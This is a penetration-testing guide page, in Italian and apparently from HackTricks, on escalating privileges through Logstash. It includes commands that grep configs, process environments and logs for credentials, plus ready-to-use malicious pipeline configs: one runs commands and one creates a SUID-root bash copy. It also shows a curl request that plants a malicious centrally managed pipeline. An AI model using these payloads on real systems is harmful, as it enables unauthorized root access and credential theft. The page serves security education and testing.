# Escalation dei privilegi di Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash viene usato per **raccogliere, trasformare e inviare log** tramite un sistema noto come **pipelines**. Queste pipelines sono composte dalle fasi **input**, **filter** e **output**. Un aspetto interessante emerge quando Logstash opera su una macchina compromessa.

### Configurazione delle pipeline

Le pipeline sono configurate nel file **/etc/logstash/pipelines.yml**, che elenca le posizioni delle configurazioni delle pipeline:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Questo file rivela dove si trovano i file **.conf**, che contengono le configurazioni delle pipeline. Quando si utilizza un **Elasticsearch output module**, è comune che le **pipelines** includano **Elasticsearch credentials**, che spesso hanno privilegi estesi a causa della necessità di Logstash di scrivere dati in Elasticsearch. I caratteri jolly nei percorsi di configurazione consentono a Logstash di eseguire tutte le pipeline corrispondenti nella directory designata.

Se Logstash viene avviato con `-f <directory>` invece di `pipelines.yml`, **tutti i file all'interno di quella directory vengono concatenati in ordine lessicografico e analizzati come un'unica configurazione**. Questo crea 2 implicazioni offensive:

- Un file "dropped" come `000-input.conf` o `zzz-output.conf` può modificare il modo in cui la pipeline finale viene assemblata
- Un file malformato può impedire il caricamento dell'intera pipeline, quindi valida attentamente i payloads prima di fare affidamento sull'auto-reload

### Enumerazione rapida su un host compromesso

Su una macchina con Logstash installato, ispeziona rapidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Controlla anche se l'API di monitoring locale è raggiungibile. Per impostazione predefinita ascolta su **127.0.0.1:9600**, il che di solito è sufficiente dopo l'accesso all'host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Questo di solito ti fornisce ID delle pipeline, dettagli di runtime e la conferma che la pipeline modificata è stata caricata.

Le credenziali recuperate da Logstash spesso sbloccano **Elasticsearch**, quindi controlla [questa altra pagina su Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

Per tentare privilege escalation, identifica innanzitutto l'utente con cui viene eseguito il servizio Logstash, tipicamente l'utente **logstash**. Assicurati di soddisfare **uno** di questi criteri:

- Possiedi **write access** a un file pipeline **.conf** **o**
- Il file **/etc/logstash/pipelines.yml** usa un wildcard, e puoi scrivere nella cartella target

Inoltre, **una** di queste condizioni deve essere soddisfatta:

- Capacità di riavviare il servizio Logstash **o**
- Il file **/etc/logstash/logstash.yml** contiene **config.reload.automatic: true**

Se è presente un wildcard nella configurazione, creare un file che corrisponda a quel wildcard permette l'esecuzione di comandi. Per esempio:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Qui, **interval** determina la frequenza di esecuzione in secondi. Nell'esempio dato, il comando **whoami** viene eseguito ogni 120 secondi, con l'output indirizzato a **/tmp/output.log**.

Con **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, Logstash rileverà automaticamente e applicherà nuove o modificate configurazioni di pipeline senza necessità di riavvio. Se non c'è un wildcard, le modifiche possono comunque essere apportate alle configurazioni esistenti, ma si raccomanda cautela per evitare interruzioni.

### Pipeline Payloads più affidabili

Il plugin di input `exec` funziona ancora nelle release correnti e richiede o un `interval` o un `schedule`. Viene eseguito facendo **forking** della JVM di Logstash, quindi se la memoria è scarsa il tuo payload potrebbe fallire con `ENOMEM` invece di eseguirsi silenziosamente.

Un payload di privilege-escalation più pratico è di solito uno che lascia un artefatto duraturo:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Se non hai i diritti per riavviare ma puoi inviare un segnale al processo, Logstash supporta anche un reload attivato da **SIGHUP** sui sistemi Unix-like:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Fai attenzione: non tutti i plugin sono reload-friendly. Ad esempio, l'input **stdin** impedisce il reload automatico, quindi non presumere che `config.reload.automatic` rilevi sempre le tue modifiche.

### Stealing Secrets from Logstash

Prima di concentrarti solo sull'esecuzione di codice, raccogli i dati a cui Logstash ha già accesso:

- Le credenziali in chiaro sono spesso hardcoded dentro gli output `elasticsearch {}`, `http_poller`, gli input JDBC, o le impostazioni relative al cloud
- Le impostazioni sicure possono trovarsi in **`/etc/logstash/logstash.keystore`** o in un'altra directory `path.settings`
- La password del keystore è frequentemente fornita tramite **`LOGSTASH_KEYSTORE_PASS`**, e le installazioni tramite pacchetto comunemente la prendono da **`/etc/sysconfig/logstash`**
- L'espansione delle variabili d'ambiente con `${VAR}` viene risolta all'avvio di Logstash, quindi vale la pena ispezionare l'ambiente del servizio

Controlli utili:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Questo vale anche la pena di verificarlo perché **CVE-2023-46672** ha dimostrato che Logstash può registrare informazioni sensibili nei log in circostanze specifiche. Su un host post-exploitation, i vecchi log di Logstash e le voci di `journald` possono quindi rivelare credenziali anche se la configurazione corrente si riferisce al keystore invece di memorizzare i segreti inline.

### Abuso della gestione centralizzata delle pipeline

In alcuni ambienti, l'host **non** si basa affatto su file `.conf` locali. Se è configurato **`xpack.management.enabled: true`**, Logstash può prelevare pipeline gestite centralmente da Elasticsearch/Kibana, e dopo l'attivazione di questa modalità le config delle pipeline locali non sono più la source of truth.

Questo significa un percorso di attacco diverso:

1. Recuperare le credenziali Elastic dalle impostazioni locali di Logstash, dal keystore o dai log
2. Verificare se l'account ha il privilegio di cluster **`manage_logstash_pipelines`**
3. Creare o sostituire una pipeline gestita centralmente in modo che l'host Logstash esegua il tuo payload al successivo intervallo di polling

L'API di Elasticsearch utilizzata per questa funzionalità è:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Questo è particolarmente utile quando i file locali sono in sola lettura, ma Logstash è già registrato per recuperare le pipeline da remoto.

## Riferimenti

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
